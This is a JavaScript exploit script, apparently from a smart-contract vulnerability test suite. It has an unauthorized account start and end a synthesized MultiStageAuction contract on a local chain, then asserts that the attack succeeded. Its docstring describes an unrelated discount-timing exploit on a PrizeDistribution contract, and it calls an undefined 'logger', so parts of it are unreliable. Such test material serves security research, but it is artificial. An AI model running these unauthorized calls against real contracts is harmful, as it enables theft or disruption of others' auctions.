require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');

// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'MultiStageAuction-14.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);

/**
 * Attempts to exploit a vulnerability in the PrizeDistribution smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    // Load the contract
    let { abi } = await compileWithVersion(source, contractFileFullName, 'MultiStageAuction', solcVersion);
    let contract = new web3.eth.Contract(abi, contractAddress);

    // Assuming the auction is not started and is supposed to be controlled by the auctioneer
    let userAccount = envInfo.accounts[1]; // Assume this is not the auctioneer

    // User attempts to start the auction unauthorizedly
    let startTX = await contract.methods.startAuction().send({
        from: userAccount,
        gas: 500000
    });
    await sleep(500);

    // Check if the phase transition to Commit was successful
    let currentPhase = await contract.methods.currentPhase().call();
    let startSuccessful = startTX.status && currentPhase === 'Commit';

    // Exploit continues: User attempts to end the auction prematurely
    let endTX = await contract.methods.endAuction().send({
        from: userAccount,
        gas: 500000
    });
    await sleep(500);

    currentPhase = await contract.methods.currentPhase().call();
    let endSuccessful = endTX.status && currentPhase === 'Ended';

    console.log(`Start Exploit was ${startSuccessful ? 'successful' : 'unsuccessful'}!`);
    console.log(`End Exploit was ${endSuccessful ? 'successful' : 'unsuccessful'}!`);

    return startSuccessful && endSuccessful;
}




/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
